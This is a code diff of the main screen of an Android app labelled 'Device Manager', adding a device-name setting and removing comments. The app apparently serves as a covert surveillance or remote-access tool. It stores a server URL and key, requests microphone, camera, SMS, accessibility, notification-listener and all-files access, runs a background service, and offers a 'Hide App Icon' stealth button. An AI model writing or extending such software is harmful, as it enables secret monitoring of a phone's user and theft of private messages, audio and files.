@@ -30,12 +30,11 @@ class MainActivity : Activity() {
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             setPadding(48, 80, 48, 80)
-            setBackgroundColor(Color.parseColor("#121212")) // Deep Charcoal
+            setBackgroundColor(Color.parseColor("#121212"))
         }
         scroll.addView(root)
         setContentView(scroll)
 
-        // Title
         root.addView(TextView(this).apply {
             text = "Device Manager"
             textSize = 26f
@@ -45,10 +44,19 @@ class MainActivity : Activity() {
             setPadding(0, 0, 0, 40)
         })
 
-        // --- CONFIG CARD ---
         val configCard = createCard()
         configCard.addView(TextView(this).apply { text = "Configuration"; setTextColor(Color.parseColor("#00E676")); textSize = 14f; setTypeface(null, Typeface.BOLD); setPadding(0,0,0,20) })
         
+        val nameEt = EditText(this).apply {
+            hint = "Device Name (e.g. John's Phone)"
+            setText(Prefs.getDeviceName(this@MainActivity))
+            setTextColor(Color.WHITE)
+            setHintTextColor(Color.GRAY)
+            setBackgroundColor(Color.parseColor("#1E1E1E"))
+            setPadding(30, 30, 30, 30)
+        }
+        configCard.addView(nameEt)
+
         val serverEt = EditText(this).apply {
             hint = "Server URL"
             setText(Prefs.getServer(this@MainActivity))
@@ -71,13 +79,13 @@ class MainActivity : Activity() {
         configCard.addView(pskEt)
 
         configCard.addView(createBtn("Save Settings", "#323232", Color.WHITE) {
+            Prefs.setDeviceName(this@MainActivity, nameEt.text.toString().trim())
             Prefs.setServer(this@MainActivity, serverEt.text.toString().trim())
             Prefs.setPsk(this@MainActivity, pskEt.text.toString().trim())
             Toast.makeText(this@MainActivity, "Saved.", Toast.LENGTH_SHORT).show()
         })
         root.addView(configCard)
 
-        // --- STATUS & SERVICE CARD ---
         val statusCard = createCard()
         statusCard.addView(TextView(this).apply { text = "Connection Status"; setTextColor(Color.parseColor("#00E676")); textSize = 14f; setTypeface(null, Typeface.BOLD); setPadding(0,0,0,10) })
         
@@ -85,7 +93,7 @@ class MainActivity : Activity() {
             setTextColor(Color.LTGRAY)
             textSize = 13f
             setPadding(0, 0, 0, 30)
-            setLineSpacing(0f, 1.5f) // FIXED strict compiler error here
+            setLineSpacing(0f, 1.5f)
         }
         statusCard.addView(statusText)
 
@@ -93,7 +101,6 @@ class MainActivity : Activity() {
         statusCard.addView(btnToggle)
         root.addView(statusCard)
 
-        // --- PERMISSIONS CARD ---
         val permCard = createCard()
         permCard.addView(TextView(this).apply { text = "Permissions & Access"; setTextColor(Color.parseColor("#00E676")); textSize = 14f; setTypeface(null, Typeface.BOLD); setPadding(0,0,0,20) })
 
@@ -102,10 +109,8 @@ class MainActivity : Activity() {
         permCard.addView(createBtn("Allow All Files Access", "#1E1E1E", Color.WHITE) { requestAllFiles() })
         permCard.addView(createBtn("Enable Accessibility Service", "#1E1E1E", Color.WHITE) { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) })
         permCard.addView(createBtn("Enable Notification Listener", "#1E1E1E", Color.WHITE) { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")) })
-        
         root.addView(permCard)
 
-        // --- DANGER CARD ---
         val dangerCard = createCard()
         dangerCard.addView(createBtn("Hide App Icon", "#B71C1C", Color.WHITE) {
             StealthManager.hide(this@MainActivity)
@@ -135,15 +140,13 @@ class MainActivity : Activity() {
 
     private fun updateStatus() {
         val isRunning = Prefs.isRunning(this)
-        
-        // Update Toggle Button
         if (isRunning) {
             btnToggle.text = "STOP SERVICE"
-            btnToggle.background = getRoundRect("#FF5252") // Muted Coral
+            btnToggle.background = getRoundRect("#FF5252")
             btnToggle.setTextColor(Color.WHITE)
         } else {
             btnToggle.text = "START SERVICE"
-            btnToggle.background = getRoundRect("#00E676") // Mint Green
+            btnToggle.background = getRoundRect("#00E676")
             btnToggle.setTextColor(Color.BLACK)
         }
 
@@ -151,13 +154,10 @@ class MainActivity : Activity() {
         sb.append(if (checkPerm(Manifest.permission.RECORD_AUDIO)) "✅ Microphone\n" else "❌ Microphone\n")
         sb.append(if (checkPerm(Manifest.permission.CAMERA)) "✅ Camera\n" else "❌ Camera\n")
         sb.append(if (checkPerm(Manifest.permission.READ_SMS)) "✅ SMS & Calls\n" else "❌ SMS & Calls\n")
-        
-        val accEnabled = TouchService.instance != null
-        sb.append(if (accEnabled) "✅ Accessibility\n" else "❌ Accessibility\n")
+        sb.append(if (TouchService.instance != null) "✅ Accessibility\n" else "❌ Accessibility\n")
         
         val notifEnabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")?.contains(packageName) == true
         sb.append(if (notifEnabled) "✅ Notifications\n" else "❌ Notifications\n")
-        
         if (Build.VERSION.SDK_INT >= 30) {
             sb.append(if (Environment.isExternalStorageManager()) "✅ All Files Access" else "❌ All Files Access")
         }
